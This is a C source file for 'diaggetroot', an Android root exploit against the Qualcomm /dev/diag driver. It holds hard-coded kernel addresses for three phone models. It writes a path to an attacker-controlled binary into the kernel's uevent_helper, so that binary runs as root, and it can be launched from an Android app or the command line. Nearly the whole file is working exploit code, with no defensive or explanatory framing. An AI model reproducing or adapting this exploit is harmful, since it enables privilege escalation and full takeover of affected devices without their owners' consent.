/*
 * Copyright (c) 2013 Hiroyuki Ikezoe
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR(S) ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR(S) BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
/*
 * Based on htcj_butterflay_diaggetroot.zip
 * <https://docs.google.com/file/d/0B8LDObFOpzZqQzducmxjRExXNnM/edit?pli=1>
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <jni.h>
#include <sys/mman.h>
#include <sys/system_properties.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

#include "diag.h"

#define  LOG_TAG    "diaggetroot"
#define  LOGI(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define  LOGD(...)  __android_log_print(ANDROID_LOG_DEBUG,LOG_TAG,__VA_ARGS__)
#define  LOGE(...)  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)

#include <android/log.h>

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  unsigned long int uevent_helper_address;
  unsigned long int delayed_rsp_id_address;
} supported_device;

supported_device supported_devices[] = {
  { "F-03D",  "V24R33Cc",     0xc0769f24, 0xc0777dd0 },
  { "SC-05D", "IMM76D.OMLPL", 0xc0c90fac, 0xc0cb0924 },
  { "SO-05D", "7.0.D.1.117",  0xc0b6cc38, 0xc0b8840c },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static bool
detect_injection_addresses(diag_injection_addresses *injection_addresses)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      injection_addresses->uevent_helper_address =
        supported_devices[i].uevent_helper_address;
      injection_addresses->delayed_rsp_id_address =
        supported_devices[i].delayed_rsp_id_address;
        return true;
    }
  }
  printf("%s (%s) is not supported.\n", device, build_id);

  return false;
}

static int
cmpare(const void *a , const void *b)
{
  const struct values *x = a;
  const struct values *y = b;
  if (x->value < y->value) {
    return -1;
  }
  if (x->value == y->value) {
    return 0;
  }
  return 1;
}

static int
prepare_injection_data(struct values *data, size_t data_size,
                       unsigned int uevent_helper_address)
{
  const char path[] = "/data/local/tmp/getroot";
  int i, data_length;

  for (i = 0, data_length = 0; i < sizeof(path) && i < data_size; i += 2) {
    data[data_length].address = uevent_helper_address + i;
    data[data_length].value = path[i] | (path[i + 1] << 8);
    data_length++;
  }

  qsort(data, data_length, sizeof(struct values), cmpare);
  return data_length;
}

static bool
inject_getroot_command_with_fd(diag_injection_addresses *injection_addresses,
                               int fd)
{
  struct values data[400];
  int data_length;

  data_length = prepare_injection_data(data, sizeof(data),
                                       injection_addresses->uevent_helper_address);

  return inject_with_file_descriptor(data, data_length,
                                     injection_addresses->delayed_rsp_id_address,
                                     fd) == 0;
}

jboolean
Java_com_example_diaggetroot_MainActivity_getrootnative(JNIEnv *env,
                                                        jobject thiz,
                                                        int fd)
{
  diag_injection_addresses injection_addresses;
  if (!detect_injection_addresses(&injection_addresses))
    return JNI_FALSE;

  return inject_getroot_command_with_fd(&injection_addresses, fd);
}

static void
usage()
{
  printf("Usage:\n");
  printf("\tdiaggetroot [uevent_helper address] [delayed_rsp_id address]\n");
}

int
main (int argc, char **argv)
{
  int fd;
  int ret;
  diag_injection_addresses injection_addresses;

  if (argc != 3) {
    if (!detect_injection_addresses(&injection_addresses)) {
      usage();
      exit(EXIT_FAILURE);
    }
  } else {
    injection_addresses.uevent_helper_address = strtoul(argv[1], NULL, 16);
    injection_addresses.delayed_rsp_id_address = strtoul(argv[2], NULL, 16);
  }

  fd = open("/dev/diag", O_RDWR);
  if (fd < 0) {
    LOGE("failed to open /dev/diag due to %s.", strerror(errno));
    exit(EXIT_FAILURE);
  }

  ret = inject_getroot_command_with_fd(&injection_addresses, fd);
  close(fd);

  if (!ret) {
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
